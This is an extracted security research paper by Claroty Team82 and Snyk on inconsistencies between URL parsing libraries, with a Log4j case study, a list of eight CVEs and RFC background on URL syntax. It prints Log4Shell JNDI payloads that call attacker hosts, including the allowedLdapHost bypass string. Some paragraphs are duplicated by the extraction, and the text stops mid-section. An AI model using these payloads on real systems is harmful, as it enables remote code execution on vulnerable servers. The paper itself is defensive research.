EXPLOITING URL  
PARSERS: THE GOOD,  
BAD, AND INCONSISTENT
By Noam Moshe and Sharon Brizinov of Claroty Team82, 
and Raul Onitza-Klugman and Kirill Efimov of Snyk
claroty.com
2
Copyright © 2021 Claroty Ltd. All rights reserved
03 Introduction  
03 Recent Example: Log4j allowedLdapHost bypass 
03 Findings 
06 URLs and RFCs 
06 What is a URL 
07 URL Components 
07   Scheme 
07   Authority/Netloc 
08   Path 
09   Query 
09   Fragment  
10   Relative References 
10 WHATWG URL Specifications 
12 URL Parsing Inconsistencies  
12   Scheme Confusion 
14   Slashes Confusion 
17   Backslashes Confusion  
20   URL Encoded Data Confusion 
22   Scheme Mixup  
23   Summary 
25 Exploiting URL Confusion Vulnerabilities 
25 Clearance (Ruby) 
25   CVE-2021-23435: Open Redirect Vulnerability 
27   But isn’t the Browser the Real Culprit? 
28 Belledonne’s Linphone SIP Stack 
28   CVE-2021-33056: Denial of Service 
31 Conclusion  
31 Vulnerabilities 
31 Our Recommendations 
32   How to Validate a URL for Redirection 
32   Try to use as few different parsers as possible 
32   Transfer a Parsed URL Across Microservice Environment 
32   Understand Differences in Parsers Involved with Application Business Logic 
33   Always Canonicalize the URL Before Parsing 
TABLE OF CONTENTS
claroty.com
3
Copyright © 2021 Claroty Ltd. All rights reserved
INTRODUCTION
The Uniform Resource Locator (URL) is integral to our lives online because we use it for surfing the web, accessing files, 
and joining video chats. If you click on a URL or type it into a browser, you’re requesting a resource hosted somewhere 
online. As a result, some devices such as our browsers, applications, and servers must receive our URL, parse it into its 
uniform resource identifier (URI) components (e.g. hostname, path, etc.) and fetch the requested resource. 
The syntax of URLs is complex, and although different libraries can parse them accurately, it is plausible for the same URL 
to be parsed differently by different libraries. The confusion in URL parsing can cause unexpected behavior in the software 
(e.g. web application), and could be exploited by threat actors to cause denial-of-service conditions, information leaks, or 
possibly conduct remote code execution attacks.
In Team82's joint research with Snyk, we examined 16 URL parsing libraries, written in a variety of programming 
languages, and noticed some inconsistencies with how each chooses to parse a given URL to its basic components. We 
categorized the types of inconsistencies into five categories, and searched for problematic code flows in web applications 
and open source libraries that exposed a number of vulnerabilities.
We learned that most of the eight vulnerabilities we found largely occurred for two reasons:
1. Multiple Parsers in Use: Whether by design or an oversight, developers sometimes use more than one URL parsing
library in projects. Because some libraries may parse the same URL differently, vulnerabilities could be introduced
into the code.
2. Specification Incompatibility: Different parsing libraries are written according to different RFCs or URL
specifications, which creates inconsistencies by design. This also leads to vulnerabilities because developers may
not be familiar with the differences between URL specifications and their implications (e.g. what should be checked
or sanitized).
Our research was partially based on previous work, including a presentation by Orange Tsai “A New Era of SSRF” and 
a comparison of WHATWG vs. RFC 3986 by cURL creator, Daniel Stenberg. We would like to thank them for their  
innovative research.
RECENT EXAMPLE: Log4j allowedLdapHost bypass 
In order to fully understand how dangerous different URL parsing primitives can be, let’s take a look into a real-life 
vulnerability that abused those differences. In December 2021, the world was taken by a storm by a remote code execution 
vulnerability in the Log4j library, a popular Java logging library. Because of Log4j’s popularity, millions of servers and 
applications were affected, forcing administrators to determine where Log4j may be in their environments and their 
exposure to proof-of-concept attacks in the wild. 
While we will not fully explain this vulnerability here, mainly because it was covered by a wide variety of people, the gist 
of the vulnerability originates in a malicious attacker-controlled string being evaluated whenever it is being logged by an 
application, resulting in a JNDI (Java Naming and Directory Interface) lookup that connects to an attacker-specified server 
and loads malicious Java code. 
claroty.com
4
Copyright © 2021 Claroty Ltd. All rights reserved
A payload triggering this vulnerability could look like this: 
${jndi:ldap://attacker.com:1389/a}
This payload would result in a remote class being loaded to the current Java context if this string would be logged by a 
vulnerable application.
Team82 preauth RCE against VMware vCenter ESXi Server, exploiting the log4j vulnerability.
Because of the popularity of this library, and the vast number of servers which this vulnerability affected, many patches and 
countermeasures were introduced in order to remedy it. We will talk about one countermeasure in particular, 
which aimed to block any attempts to load classes from a remote source using JNDI. 
This particular remedy was made inside the lookup process of the JNDI interface. Instead of allowing JNDI lookups from 
arbitrary remote sources, which could result in remote code execution, JNDI would allow only lookups from a set of 
predefined whitelisted hosts, allowedLdapHost, which by default contained only localhost. This would mean that 
even if an attacker-supplied input is evaluated, and a JNDI lookup is made, the lookup process will fail if the given host is not in 
the whitelisted set. An attacker-hosted class would not be loaded and the vulnerability is rendered moot. 
However, soon after this fix, a bypass to this mitigation was found (CVE-2021-45046), which once again allowed  
remote JNDI lookup and allowed the vulnerability to be exploited in order to achieve RCE. Let’s analyze the bypass,  
which is as follows:
${jndi:ldap://127.0.0.1#.evilhost.com:1389/a}
and Directory Interface) lookup that connects to an attacker-specified server and loads 
malicious Java code.
A payload triggering this vulnerability could look like this:
${jndi:ldap://attacker.com:1389/a}
This payload would result in a remote class being loaded to the current Java context if this string 
would be logged by a vulnerable application.
Team82 preauth RCE against VMware vCenter ESXi Server, exploiting the log4j vulnerability
Because of the popularity of this library, and the vast number of servers which this vulnerability 
affected, many patches and countermeasures were introduced in order to remedy this 
vulnerability. We will talk about one countermeasure in particular, which aimed to block any 
attempts to load classes from a remote source using JNDI.
This particular remedy was made inside the lookup process of the JNDI interface. Instead of 
allowing JNDI lookups from arbitrary remote sources, which could result in remote code 
execution, JNDI would allow only lookups from a set of predefined whitelisted hosts,
allowedLdapHost, which by default contained only localhost. This would mean that even if
an attacker-given input is evaluated, and a JNDI lookup is made, the lookup process will fail if
the given host is not in the whitelisted set. An attacker-hosted class would not be loaded and the 
vulnerability is rendered moot.
claroty.com
5
Copyright © 2021 Claroty Ltd. All rights reserved
As we can see, this payload once again contains a URL, however the Authority component (host) of the URL seems 
irregular, containing two different hosts: 127.0.0.1 and evilhost.com.  As it turns out, this is exactly where the bypass 
lies. This bypass stems from the fact that two different (!) URL parsers were used inside the JNDI lookup process, one parser 
for validating the URL, and another for fetching it, and depending on how each parser treats the Fragment portion (#) of 
the URL, the Authority changes too.
In order to validate that the URL’s host is allowed, Java’s URI class was used, which parsed the URL, extracted the URL’s 
host, and checked if the host is inside the whitelisted set of allowed hosts. And indeed, if we parse this URL using Java’s 
URI, we find out that the URL’s host is 127.0.0.1, which is included in the whitelist. However, on certain operating 
systems (mainly macOS) and specific configurations, when the JNDI lookup process fetches this URL, it does not try 
to fetch it from 127.0.0.1, instead it makes a request to 127.0.0.1#.evilhost.com. This means that while this 
malicious payload will bypass the allowedLdapHost localhost validation (which is done by the URI parser), it will 
still try to fetch a class from a remote location.
This bypass showcases how minor discrepancies between URL parsers could create huge security concerns and 
real-life vulnerabilities.
FINDINGS 
Throughout our research, we examined 16 URL parsing libraries including: urllib (Python), urllib3 (Python), rfc3986 (Python), 
httptools (Python), curl lib (cURL), Wget, Chrome (Browser), Uri (.NET), URL (Java), URI (Java), parse_url (PHP), url (NodeJS), 
url-parse (NodeJS), net/url (Go), uri (Ruby) and URI (Perl). .
We found five categories of inconsistencies: scheme confusion, slashes confusion, backslash confusion, URL encoded 
data confusion, and scheme mixup. 
We were able to translate these inconsistencies into five classes of vulnerabilities: server-side request forgery (SSRF), 
cross-site scripting (XSS), open redirect, filter bypass, and denial of service (DoS). In some cases, these vulnerabilities 
could be exploited further to achieve a greater impact, including remote code execution.
Eventually, based on our research and the code patterns we searched, we discovered eight vulnerabilities, below, in 
existing web applications and third-party libraries written in different languages used by many popular web 
applications.
1) Flask-security (Python, CVE-2021-23385)
2) Flask-security-too (Python, CVE-2021-32618)
3) Flask-User (Python, CVE-2021-23401)
4) Flask-unchained (Python, CVE-2021-23393)
5) Belledonne’s SIP Stack (C, CVE-2021-33056)
6) Video.js (JavaScript, CVE-2021-23414)
7) Nagios XI (PHP, CVE-2021-37352)
8) Clearance (Ruby, CVE-2021-23435)
claroty.com
6
Copyright © 2021 Claroty Ltd. All rights reserved
URLS AND RFCS
WHAT IS A URL? 
We think we know URLs, but do we actually? They look simple enough, containing a host, path, and on occasion a query. 
However in reality they could be a whole lot more complicated.
Today, two principal URL specifications exist: URL RFCs by IETF, and WHATWG specifications. While those standards 
describe the same URL-parsing primitives, some inconsistencies exist between those two specifications (we will cover 
these inconsistencies in this section). In addition, different RFC versions have changed the way they treat various URL parts 
between releases, making backward compatibility a difficult task.  
To start digging deeper, we looked into the many RFCs defining URLs and URIs over the years. In fact, since 1994 (RFC 1738), 
there have been many changes to the definitions of URLs, the biggest revisions being  RFC 1808 in 1995, RFC 2396 in 1998, 
and RFC 3986 in 2005.
Most of the RFCs over the years defined URLs in a similar way:
   scheme://authority/path?query#fragment
For example:
   foo://example.com:8042/over/there?name=ferret#nose
Lets dive deeper into the different components of the URL defined in different RFCs over the years. 
RFC 1738
1994 
First Definition of 
URL Syntax and 
components
RFC 2141
1997 
Creation of URN 
Syntax
RFC 1808
1995 
Added Syntax for 
Relative URLs
RFC 2396
1998 
Revision of URL and 
expansion of  
some components
RFC 2732
1999 
Added support 
for IPV6
RFC 3986
2005 
Obsoleting prior 
standards defining 
URL as we know it
claroty.com
7
Copyright © 2021 Claroty Ltd. All rights reserved
URL COMPONENTS 
SCHEME
The scheme defines the protocol to be used (i.e. HTTP, HTTPS, FTP etc.), and could define different parsing primitives for the 
URL components following the scheme. 
The available character set is well defined, allowing lowercase letters, digits, plus sign (+), period (.) and a hyphen (-). As of 
RFC 2396, valid schemes require the first character to be a lowercase letter. Prior to that, any combination of the character 
set was valid as a scheme. 
Here is how a scheme is defined in RFC 2396 and RFC 3986: 
And here is how it is defined in RFC 1738 and RFC 1808:
The scheme is the only required component; all others are optional.  
AUTHORITY/NETLOC
This component’s name was changed from netloc to authority, but still refers to the host that holds the wanted resource.
The authority component of the URL is built from three sub-components, below.
Whereas userinfo is a user:password string, host is either a hostname or an IP address, and port  is a  
digit within the valid port range.
As of RFC 2396, the usage of user:password was discouraged, and in RFC 3986 it was deprecated.
RFC 2396
URL Components
Scheme
The scheme defines the protocol to be used (i.e. HTTP, HTTPS, FTP etc.), and could define
different parsing primitives for the URL components following the scheme.
The available character set is well defined, allowing lowercase letters, digits, plus sign (+), 
period (.) and a hyphen (-). As of RFC 2396, valid schemes require the first character to be a 
lowercase letter. Prior to that, any combination of the character set was valid as a scheme. 
Here is how a scheme is defined in RFC 2396 and RFC 3986: 
scheme      = ALPHA *( ALPHA / DIGIT / "+" / "-" / "." ) 
And here is how it is defined in RFC 1738 and RFC 1808:
scheme      
= 1*[ lowalpha | digit | "+" | "-" | "." ]
The scheme is the only required component; all others are optional. 
Authority/Netloc
This component's name was changed from netloc to authority, but still refers to the host that 
holds the wanted resource.
The authority component of the URL is built from three sub-components, below.
authority   = [ userinfo "@" ] host [ ":" port ]
Whereas userinfo is a user:password string, host is either a hostname or an IP address, 
and port is a digit within the valid port range.
As of RFC 2396, the usage of user:password was discouraged, and in RFC 3986 it was
deprecated.
RFC 2396
Some URL schemes use the format "user:password" in the userinfo
field. This practice is NOT RECOMMENDED, because the passing of
authentication information in clear text (such as URI) has proven to
be a security risk in almost every case where it has been used.
RFC 3986
Use of the format "user:password" in the userinfo field is
deprecated.  Applications should not render as clear text any data
URL Components
Scheme
The scheme defines the protocol to be used (i.e. HTTP, HTTPS, FTP etc.), and could define